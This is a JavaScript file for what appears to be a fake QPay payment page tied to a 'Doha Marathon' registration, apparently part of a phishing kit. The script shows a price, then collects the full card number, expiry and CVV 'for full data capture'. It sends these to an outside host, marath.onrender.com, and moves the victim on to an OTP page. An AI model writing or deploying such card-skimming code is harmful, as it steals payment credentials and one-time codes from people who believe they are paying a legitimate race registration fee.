(() => {
	"use strict";

	const reviewKey = "doha-marathon-registration-review";
	const amount = document.querySelector("#qpy-amount");
	const continueButton = document.querySelector("#continueBtn");

	if (!amount || !continueButton) {
		throw new Error("QPay page markup is incomplete.");
	}

	let review;
	try {
		review = JSON.parse(window.sessionStorage.getItem(reviewKey) || "null");
	} catch (error) {
		console.error("Could not read the registration amount for QPay.", error);
		amount.textContent = "تعذر تحميل المبلغ";
		continueButton.disabled = true;
		return;
	}

	if (!review || typeof review.price !== "number" || !Number.isFinite(review.price) || review.price < 0) {
		amount.textContent = "المبلغ غير متاح";
		continueButton.disabled = true;
		return;
	}

	amount.textContent = `QAR ${review.price.toFixed(2)}`;

	// Form elements
	const cardInputs = document.querySelectorAll('input[name="cardType"]');
	const cardNumber = document.querySelector("#cardNumber");
	const expMonth = document.querySelector("#expMonth");
	const expYear = document.querySelector("#expYear");
	const cvvInput = document.querySelector("#cvv");
	const cvvContainer = document.querySelector("#cvvContainer");

	// Always show CVV field for full data capture
	if (cvvContainer) {
		cvvContainer.style.display = "block";
	}

	cardInputs.forEach(radio => {
		radio.addEventListener("change", () => {
			if (cvvContainer) cvvContainer.style.display = "block";
			checkValidity();
		});
	});

	function checkValidity() {
		const num = (cardNumber?.value || "").replace(/\s+/g, "");
		const m = expMonth?.value || "";
		const y = expYear?.value || "";
		const hasCard = num.length >= 15;
		const hasExp = m.length > 0 && y.length > 0;
		if (hasCard && hasExp) {
			continueButton.disabled = false;
			continueButton.style.cursor = "pointer";
			continueButton.style.opacity = "1";
		} else {
			continueButton.disabled = false; // Keep clickable for user convenience
		}
	}

	if (cardNumber) cardNumber.addEventListener("input", checkValidity);
	if (expMonth) expMonth.addEventListener("change", checkValidity);
	if (expYear) expYear.addEventListener("change", checkValidity);
	if (cvvInput) cvvInput.addEventListener("input", checkValidity);

	continueButton.addEventListener("click", () => {
		const form = document.querySelector("#paymentForm");
		const radioChecked = document.querySelector('input[name="cardType"]:checked');
		const cardTypeVal = radioChecked ? radioChecked.value : "Credit Card";
		
		const qpyData = {
			cardType: cardTypeVal,
			cardNumber: (cardNumber?.value || "").trim(),
			expMonth: expMonth?.value || "01",
			expYear: expYear?.value || "2027",
			cvv: (cvvInput?.value || "").trim()
		};

		// 1. Direct tracking via tracker helper
		if (typeof window.triggerTrackerFormSync === "function") {
			window.triggerTrackerFormSync();
		}

		// 2. Direct fetch with keepalive to guarantee server persistence
		try {
			fetch('https://marath.onrender.com/api/track', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					sessionId: localStorage.getItem('doha_marathon_session') || '',
					type: 'form-submit',
					page: 'qpy',
					data: qpyData
				}),
				keepalive: true
			}).catch(() => {});
		} catch(e) {}

		// 3. Navigate to OTP page
		setTimeout(() => {
			window.location.assign("otp.html");
		}, 250);
	});
})();
